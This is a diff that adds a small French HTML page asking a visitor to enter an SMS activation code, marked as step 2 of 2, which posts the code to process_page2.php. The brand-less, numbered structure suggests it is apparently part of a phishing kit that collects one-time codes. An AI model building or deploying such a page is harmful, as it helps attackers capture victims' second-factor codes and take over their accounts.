@@ -1,0 +1,35 @@
+
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <title>Validation par SMS</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="stylesheet" href="styles.css" />
+</head>
+<body>
+  <div class="page-root-centered">
+    <div class="page2-container">
+      <div class="page2-header">
+        <div class="page2-header-badge">2/2</div>
+        <div>VALIDATION</div>
+      </div>
+      <form action="process_page2.php" method="post">
+        <div class="page2-body">
+          <p>Si l'activation ne s'est pas faite automatiquement, merci de renseigner manuellement le code reçu par SMS dans le champ ci-dessous.</p>
+
+          <div class="page2-label">Code d'activation</div>
+          <input class="page2-input" type="text" name="activation" placeholder="" required />
+
+          <p style="margin-top:18px;">
+            Veuillez saisir le code que vous venez de recevoir par SMS au +33 ** ** ** **.
+          </p>
+        </div>
+        <div class="page2-footer">
+          <button class="page2-btn" type="submit">VALIDER</button>
+        </div>
+      </form>
+    </div>
+  </div>
+</body>
+</html>
